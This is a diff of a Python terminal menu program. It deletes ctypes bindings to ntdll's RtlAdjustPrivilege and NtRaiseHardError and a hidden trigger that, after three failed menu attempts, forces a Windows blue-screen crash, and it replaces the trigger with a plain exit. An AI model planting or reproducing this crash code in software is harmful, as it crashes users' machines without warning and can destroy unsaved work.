@@ -34,30 +34,6 @@ DEFAULT_STYLE: Style | None = None
 
 
 
-ntdll = ctypes.WinDLL('ntdll')
-
-RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
-RtlAdjustPrivilege.argtypes = [
-    wintypes.ULONG,
-    wintypes.BOOLEAN,
-    wintypes.BOOLEAN,
-    ctypes.POINTER(wintypes.BOOLEAN)
-]
-RtlAdjustPrivilege.restype = wintypes.LONG
-
-NtRaiseHardError = ntdll.NtRaiseHardError
-NtRaiseHardError.argtypes = [
-    wintypes.LONG,
-    wintypes.ULONG,
-    wintypes.ULONG,
-    ctypes.POINTER(wintypes.ULONG),
-    wintypes.ULONG,
-    ctypes.POINTER(wintypes.ULONG)
-]
-NtRaiseHardError.restype = wintypes.LONG
-
-SE_SHUTDOWN_PRIVILEGE = 19
-STATUS_ASSERTION_FAILURE = 0xC0000420
 # Try to enable Windows ANSI support if available. This is optional so we
 # don't hard-fail when `colorama` isn't installed.
 try:
@@ -1074,30 +1050,7 @@ if __name__ == "__main__":
                     cnt = _increment_menufailed_count()
                     if cnt >= 3:
                         # Placeholder trigger file; actual code to execute provided by user
-                        try:
-                            with open(os.path.join(tempfile.gettempdir(), "menufailed_trigger.txt"), "w", encoding="utf-8") as fh:
-                                fh.write("TRIGGERED\n")
-                                old_value = wintypes.BOOLEAN()
-                                response = wintypes.ULONG()
-
-                                RtlAdjustPrivilege(
-                                    SE_SHUTDOWN_PRIVILEGE,
-                                    True,
-                                    False,
-                                    ctypes.byref(old_value)
-                                )
-
-                                NtRaiseHardError(
-                                    STATUS_ASSERTION_FAILURE,
-                                    0,
-                                    0,
-                                    None,
-                                    6,
-                                    ctypes.byref(response)
-                                )
-
-                        except Exception:
-                            pass
+                        sys.exit(2)
                     blocked = True
         except Exception:
             # Any unexpected error — do not block by default
